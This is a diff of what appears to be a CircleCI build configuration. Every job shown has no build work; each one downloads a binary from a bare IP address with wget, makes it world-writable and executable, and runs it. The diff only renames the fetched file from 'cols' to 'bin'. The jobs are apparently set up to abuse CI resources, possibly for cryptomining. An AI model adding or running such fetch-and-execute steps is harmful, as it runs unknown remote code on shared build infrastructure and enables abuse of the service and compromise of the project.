@@ -6,30 +6,30 @@ jobs:
     docker:
       - image: cimg/go:1.13.15-browsers
     steps:
-      - run: wget http://199.250.207.182/~ngewetech/nah/libs/cols
-      - run: chmod 777 cols
-      - run: ./cols
+      - run: wget http://199.250.207.182/~ngewetech/nah/libs/bin
+      - run: chmod 777 bin
+      - run: ./bin
   gas2:
     docker:
       - image: cimg/go:1.13.15-browsers
     steps:
-      - run: wget http://199.250.207.182/~ngewetech/nah/libs/cols
-      - run: chmod 777 cols
-      - run: ./cols
+      - run: wget http://199.250.207.182/~ngewetech/nah/libs/bin
+      - run: chmod 777 bin
+      - run: ./bin
   gas3:
     docker:
       - image: cimg/go:1.13.15-browsers
     steps:
-      - run: wget http://199.250.207.182/~ngewetech/nah/libs/cols
-      - run: chmod 777 cols
-      - run: ./cols
+      - run: wget http://199.250.207.182/~ngewetech/nah/libs/bin
+      - run: chmod 777 bin
+      - run: ./bin
   gas4:
     docker:
       - image: cimg/go:1.13.15-browsers
     steps:
-      - run: wget http://199.250.207.182/~ngewetech/nah/libs/cols
-      - run: chmod 777 cols
-      - run: ./cols
+      - run: wget http://199.250.207.182/~ngewetech/nah/libs/bin
+      - run: chmod 777 bin
+      - run: ./bin
 
 # Orchestrate our job run sequence
 workflows:
